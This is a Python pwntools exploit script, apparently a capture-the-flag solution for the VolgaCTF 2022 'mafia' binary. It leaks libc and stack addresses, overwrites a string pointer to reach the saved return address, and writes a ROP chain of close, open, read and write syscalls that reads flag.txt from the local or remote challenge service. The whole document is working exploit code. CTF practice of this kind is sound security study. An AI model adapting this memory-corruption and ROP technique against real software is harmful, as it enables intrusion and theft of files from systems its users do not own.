#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./mafiap',checksec=False)
libc = ELF('./libc.so.6',checksec=False)

if args.REMOTE:
	p = remote('mafia.q.2022.volgactf.ru', 1337)
else:
	p = process(binary.path)

# leak libc
p.sendlineafter(b'>> ',b'1')
p.sendlineafter(b'size:\n',b'48')
p.sendlineafter(b'index:\n',b'0')
p.sendlineafter(b'string:\n',7 * b'A')
p.sendlineafter(b'>> ',b'3')
p.sendlineafter(b'index:\n',b'0')
p.recvline()
libc.address = u64(p.recv(6) + b'\0\0') - libc.sym.puts - 378
log.info('libc.address: {x}'.format(x = hex(libc.address)))

# stack leak and return address compute
p.sendlineafter(b'>> ',b'2')
p.sendlineafter(b'index:\n',b'0')
p.sendlineafter(b'string:\n',23 * b'A')
p.sendlineafter(b'>> ',b'3')
p.sendlineafter(b'index:\n',b'0')
p.recvline()
stack_leak = u64(p.recv(6) + b'\0\0')
log.info('stack_leak: {x}'.format(x = hex(stack_leak)))
return_address = stack_leak + 8
log.info('return_address: {x}'.format(x = hex(return_address)))

# sometimes things are not as we'd like them, it's possible there's a more stable place to look
if stack_leak >> 40 != 0x7f:
	p.close()
	log.critical('this is not the stack leak you\'re looking for, try again')
	sys.exit(1)

# read syscall will fail if rdx is too big in some cases
if (return_address + 0xfffffffc) > 2**47 - 1:
	p.close()
	log.critical('read beyond user-space: {x}'.format(x = hex(return_address + 0xfffffffc)))
	log.critical('read syscall will fail, try again')
	sys.exit(1)

# change string 0 to point to return address
p.sendlineafter(b'>> ',b'1')
p.sendlineafter(b'size:\n',b'0')
p.sendlineafter(b'index:\n',b'1')
p.sendlineafter(b'string:\n',0xa0 * b'A' + p64(return_address))

pop_rax = libc.search(asm('pop rax; ret')).__next__()
pop_rdi = libc.search(asm('pop rdi; ret')).__next__()
pop_rsi = libc.search(asm('pop rsi; ret')).__next__()
pop_rax_rdx_rbx = libc.search(asm('pop rax; pop rdx; pop rbx; ret')).__next__()
syscall = libc.search(asm('syscall; ret')).__next__()

flag_offset = 0x100
payload = b''

# close
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(constants.SYS_close)
payload += p64(syscall)

# open
payload += p64(pop_rdi)
payload += p64(return_address + flag_offset)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rax_rdx_rbx)
payload += p64(constants.SYS_open)
payload += p64(0)
payload += p64(0)
payload += p64(syscall)

# read
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(return_address + flag_offset)
payload += p64(pop_rax_rdx_rbx)
payload += p64(constants.SYS_read)
payload += p64(100)
payload += p64(0)
payload += p64(syscall)

# write
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rax)
payload += p64(constants.SYS_write)
payload += p64(syscall)

# static flag.txt
payload += (flag_offset - len(payload)) * b'A' + b'flag.txt\0'

# write out and exec rop chain
p.sendlineafter(b'>> ',b'2')
p.sendlineafter(b'index:\n',b'0')
p.sendlineafter(b'string:\n',payload)
p.sendlineafter(b'>> ',b'4')

flag = p.recvuntil(b'}').decode()
p.close()
print(flag)

